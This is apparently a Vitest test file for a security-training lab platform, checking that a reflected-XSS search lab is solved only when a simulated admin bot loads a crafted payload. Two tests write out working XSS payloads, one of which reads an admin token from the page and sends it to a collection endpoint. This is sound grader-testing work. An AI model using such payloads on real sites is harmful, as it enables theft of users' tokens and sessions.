import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { startTestApp, CookieClient, type TestApp } from "./helpers.js";

describe("lab: xss-reflected-search (real headless-browser verification)", () => {
  let testApp: TestApp;
  beforeAll(async () => {
    testApp = await startTestApp({ apiPort: 4107, labPortStart: 6275, labPortEnd: 6299 });
  });
  afterAll(async () => {
    await testApp.manager.stopAll();
    await testApp.close();
  });

  it("a plain non-exploiting search term never solves it", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/xss-reflected-search/instances", {
      method: "POST",
    });
    const target = launch.body.instance.baseUrl;

    const res = await fetch(`${target}/search?q=password+reset`);
    expect(res.status).toBe(200);
    expect(await res.text()).toContain("password reset");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(false);
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("the admin-bot route rejects paths for labs that don't use it (regression guard)", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    // idor-invoice-leak doesn't declare requiresBrowserBot.
    const launch = await client.json<{ instance: { id: string } }>("/api/labs/idor-invoice-leak/instances", { method: "POST" });
    const res = await client.fetch(`/api/instances/${launch.body.instance.id}/simulate-admin-visit`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ path: "/invoices/1001" }),
    });
    expect(res.status).toBe(400);
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("merely reflecting a <script> tag into your OWN (non-admin) view does not solve it", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/xss-reflected-search/instances", {
      method: "POST",
    });
    const target = launch.body.instance.baseUrl;

    const payload = `<script>fetch('/collect?token=guessed')</script>`;
    const res = await fetch(`${target}/search?q=${encodeURIComponent(payload)}`);
    expect(res.status).toBe(200);
    const html = await res.text();
    // Confirms the reflection really is unescaped (the actual vulnerability).
    expect(html).toContain("<script>fetch('/collect?token=guessed')</script>");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(false); // no real browser ever ran this
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("a real admin-bot visit to a crafted exfiltration payload solves it", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/xss-reflected-search/instances", {
      method: "POST",
    });
    const instanceId = launch.body.instance.id;

    const payload = `<script>fetch('/collect?token=' + document.getElementById('admin-token').dataset.token)</script>`;
    const visitPath = `/search?q=${encodeURIComponent(payload)}`;

    const simulate = await client.json<{ ok: boolean; error?: string }>(
      `/api/instances/${instanceId}/simulate-admin-visit`,
      { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ path: visitPath }) },
    );
    expect(simulate.status).toBe(200);
    expect(simulate.body.ok).toBe(true);

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${instanceId}`);
    expect(dto.body.instance.solved).toBe(true);

    const progress = await client.json<{ xp: number }>("/api/progress");
    expect(progress.body.xp).toBe(75); // easy difficulty

    await client.fetch(`/api/instances/${instanceId}/stop`, { method: "POST" });
  }, 30_000);
});
